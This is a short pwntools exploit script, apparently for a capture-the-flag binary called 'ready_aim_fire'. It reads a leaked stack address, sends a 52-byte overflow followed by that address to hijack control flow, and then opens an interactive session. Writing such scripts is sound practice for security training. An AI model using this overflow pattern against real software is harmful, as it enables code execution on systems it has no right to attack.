from pwn import *

exe = ELF("./ready_aim_fire")

p = process("./ready_aim_fire")
gdb.attach(p, gdbscript="""
    b *0x4028c6
""")


p.recvline()
stack = int(p.recvline().strip(), 16)

log.success(f"{hex(stack)=}")

payload = b"A" * 52
payload += p64(stack)

p.sendline(payload)

p.interactive()